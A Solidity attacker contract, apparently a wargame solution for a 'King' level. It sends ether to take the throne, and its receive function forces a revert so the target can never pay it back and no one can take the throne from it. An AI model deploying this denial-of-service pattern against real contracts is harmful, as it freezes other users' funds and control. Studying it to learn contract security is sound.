// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingAttacker {
    function attack(address king) public payable {
        (bool success, ) = king.call{value: msg.value}("");
        require(success, "Call failed.");
    }

    receive() external payable {
        (bool success, ) = msg.sender.call{value: 0}("");
        require(success, "Call failed.");
    }
}
